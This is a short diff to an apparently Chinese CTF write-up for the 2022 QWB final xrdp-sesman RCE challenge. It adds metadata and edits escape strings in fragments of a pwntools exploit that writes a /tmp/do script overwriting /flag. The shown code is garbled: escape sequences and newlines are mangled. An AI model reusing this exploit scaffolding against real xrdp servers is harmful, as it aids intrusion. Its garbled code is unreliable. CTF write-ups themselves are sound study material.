@@ -65,6 +65,9 @@ prerequisites:
 - CVE 搜索 + patch diff 分析
 - 整数溢出（32 位 signed）原理
 - C 函数调用约定（rdi 第一个参数）
+contest_normalized: "强网杯"
+contest_year: 2022
+subcategory_guess: "rce"
 ---
 # 2022QWB final RDP
 
@@ -207,7 +210,7 @@ from pwn import *
 elf=ELF('./xrdp-sesman')
 li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')
-lg = lambda x : print(' 33[32m' + str(x) + ' 33[0m')
+lg = lambda x : print('\\x0033[32m' + str(x) + '\\x0033[0m')
 with open("/tmp/do", "w") as f:
  f.write("#!/bin/bashnecho "Ayaka" > /flag")
 os.system("chmod a+x /tmp/do")
@@ -316,7 +319,7 @@ from pwn import *
 elf=ELF('./xrdp-sesman')
 li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')
-lg = lambda x : print(' 33[32m' + str(x) + ' 33[0m')
+lg = lambda x : print('\\x0033[32m' + str(x) + '\\x0033[0m')
 with open("/tmp/do", "w") as f:
  f.write("#!/bin/bashnecho "Ayaka" > /flag")
 os.system("chmod a+x /tmp/do")
